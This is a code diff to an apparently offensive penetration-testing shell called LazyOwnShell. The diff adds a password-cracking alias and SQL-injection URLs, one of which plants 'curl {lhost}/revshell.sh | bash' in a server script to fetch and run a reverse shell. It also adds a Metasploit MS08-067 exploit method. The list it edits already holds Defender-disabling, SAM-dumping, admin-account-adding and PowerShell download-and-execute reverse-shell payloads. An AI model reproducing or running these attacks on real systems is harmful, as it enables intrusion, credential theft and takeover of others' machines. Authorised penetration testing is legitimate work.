@@ -97,6 +97,7 @@ class LazyOwnShell(Cmd):
         "tor": "sh sudo bash sessions/tor.sh",
         "ses": "sh ls sessions",
         "sniff": "run lazysniff",
+        "unshadow": "sh sudo unshadow sessions/passwd sessions/shadow > sessions/hash.txt && sudo john sessions/hash.txt -w /usr/share/wordlists/rockyou.txt", 
         "venom": "run lazymsfvenom",
         "wps":"sh sudo bash modules/lazywps.sh",
         "ww": "whatweb",
@@ -5038,6 +5039,7 @@ class LazyOwnShell(Cmd):
         """
         lhost = self.params["lhost"]
         lport = self.params["lport"]
+        url = self.params["url"]
         if not check_lhost(lhost):
             return
 
@@ -5120,11 +5122,14 @@ class LazyOwnShell(Cmd):
             ("WIN Disable defender", "Set-MpPreference -SubmitSamplesConsent 2 -MAPSReporting 0"),
             ("WIN sam", "cd / ; mkdir Temp ; reg save hklm\sam c:\Temp\sam ; reg save hklm\system c:\Temp\system ; cd Temp ; download sam ; download system"),
             ("PYPYKATZ", "pypykatz registry --sam sam system"),
-            ("WEB linkedin.com workers scrapper", 'var employees = []; employees = employees.concat(document.getElementsByTagName("h3")); for(var i=0;i<employees[0].length;i++){ 	console.log(employees[0][i].innerHTML) }'),
-            ("WIN WEB Inyection", "abc.txt | powershell -enc "),
+("WIN WEB Inyection", "abc.txt | powershell -enc "),
             ("WIN WEB Inyection" ,'abc.txt | net user lazyown abc123! /add ; net localgroup administrators lazyown /add'),
             ("WIN ReverShell winbase64encode", f'echo -n "IEX(new-objectnet.webclient).downloadstring(\'http://{lhost}/Invoke-PowerShellTcp.ps1\')" | iconv -t UTF-16LE | base64 -w0'),
-            ("WIN ReverShell echo", f"echo 'Invoke-PowerShellTcp -Reverse -IPAddress {lhost} -Port {lport}' >> sessions/Invoke-PowerShellTcp.ps1")
+            ("WIN ReverShell echo", f"echo 'Invoke-PowerShellTcp -Reverse -IPAddress {lhost} -Port {lport}' >> sessions/Invoke-PowerShellTcp.ps1"),            
+            ("WEB linkedin.com workers scrapper", 'var employees = []; employees = employees.concat(document.getElementsByTagName("h3")); for(var i=0;i<employees[0].length;i++){ 	console.log(employees[0][i].innerHTML) }'),
+            ("WEB Cady", f"{url}/admindashboard?s=aa&o=ASC%3b++select+\"ping%3b\"+INTO+OUTFILE++'/data/scripts/dbstatus.json'+%3b"),
+            ("WEB Cady yummy", f"{url}/admindashboard?s=aa&o=ASC%3b++select+\"curl+{lhost}/revshell.sh+|bash%3b\"+INTO+OUTFILE++'/data/scripts/fixer-v___'+%3b ")
+
         ]
         
         for idx, (alias, cmd) in enumerate(commands_list):
@@ -12697,7 +12702,7 @@ class LazyOwnShell(Cmd):
             print_error(f"Error parsing JSON response: {json_e}")
         except Exception as e:
             print_error(f"An error occurred: {e}")
-
+        
     def do_evidence(self, line=''):
         """
         Compresses the 'sessions' folder and encodes it into a video using the lazyown_infinitestorage.py script.
@@ -12814,6 +12819,7 @@ class LazyOwnShell(Cmd):
                 print_error("Por favor, ingresa un número válido.")
 
         return
+
     def do_rejetto_hfs_exec(self, line):
         """
         HttpFileServer version 2.3. Vulnerable using the module rejetto_hfs_exec of metasploit
@@ -12846,6 +12852,63 @@ class LazyOwnShell(Cmd):
             os.remove(rc_file_path)
 
         print_msg(f"Executed rejetto_hfs_exec exploitation on {rhost} with listener {lhost}.")
+        return
+        
+    def do_ms08_067_netapi(self, line):
+        """
+        SMB CVE-2008-4250. Vulnerable using the module ms08_067_netapi of metasploit
+        :param line: Command line input that provides the LHOST and RHOST.
+        :type line: str
+        :returns: None
+        """
+
+        rhost = self.params["rhost"]
+        lhost = self.params["lhost"]
+        lport = self.params["lport"]
+
+        if not rhost or not lhost:
+            print_warn("RHOST and LHOST must be specified.")
+            return
+
+        rc_file_path = "/tmp/rejetto_hfs_exec.rc"
+        with open(rc_file_path, "w") as file:
+            file.write(f"""
+            use exploit/windows/smb/ms08_067_netapi
+            set RHOSTS {rhost}
+            set LHOST {lhost}
+            set LPORT {lport}
+            run
+            """)
+
+        subprocess.run(["msfconsole", "-r", rc_file_path], check=True)
+
+        if os.path.exists(rc_file_path):
+            os.remove(rc_file_path)
+
+        print_msg(f"Executed rejetto_hfs_exec exploitation on {rhost} with listener {lhost}.")
+        return
+
+    def do_nano(self, line):
+        """
+        Opens or creates the file using line in the sessions directory for editing using nano.
+
+        :param line: name of the file to use in nano in session directory.
+
+        :returns: None
+        """
+        if not line:
+            line = input ("    [!] enter the filename: ") or 'unamed_lazyownfile'
+        users_file_path = os.path.join("sessions", line)
+        print_msg(users_file_path)
+        if not os.path.exists(users_file_path):
+            print_warn(f"{users_file_path} does not exist. Creating the file.")
+            os.makedirs(os.path.dirname(users_file_path), exist_ok=True)
+            with open(users_file_path, 'w') as f:
+                pass 
+
+        print_msg(f"Opening {users_file_path} with nano for editing.")
+        os.system(f"nano {users_file_path} -l")
+
         return
 
 if __name__ == "__main__":
